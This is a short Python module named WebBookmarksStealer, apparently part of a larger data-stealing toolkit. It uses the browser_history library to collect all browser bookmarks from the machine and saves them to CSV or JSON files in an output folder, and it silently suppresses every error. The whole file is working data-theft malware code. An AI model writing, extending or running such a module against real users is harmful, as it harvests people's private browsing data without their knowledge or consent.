import os

from browser_history import  get_bookmarks

from config import Constant
from config import ModuleManager


class WebBookmarksStealer(ModuleManager):
    def __init__(self) -> None:
        super().__init__(module_name="WebBookmarkStealer")
        
        self.browsers_folder = os.path.join(self.output_folder_user, 'browsers')
        self.output_filename_csv = os.path.join(self.browsers_folder, 'browser_bookmarks_all.csv')
        self.output_filename_json = os.path.join(self.browsers_folder, 'browser_bookmarks_all.json')
        
        if not os.path.isdir(self.browsers_folder):
            os.makedirs(self.browsers_folder)
    
    def run(self):
        try:
            outputs = get_bookmarks()
        except:
            return
        
        if Constant.browser_bookmark_csv:
            try:
                outputs.save(f'{self.output_filename_csv}')
            except:
                pass
    
        if Constant.browser_bookmark_json:
            try:
                outputs.save(f'{self.output_filename_json}')
            except:
                pass
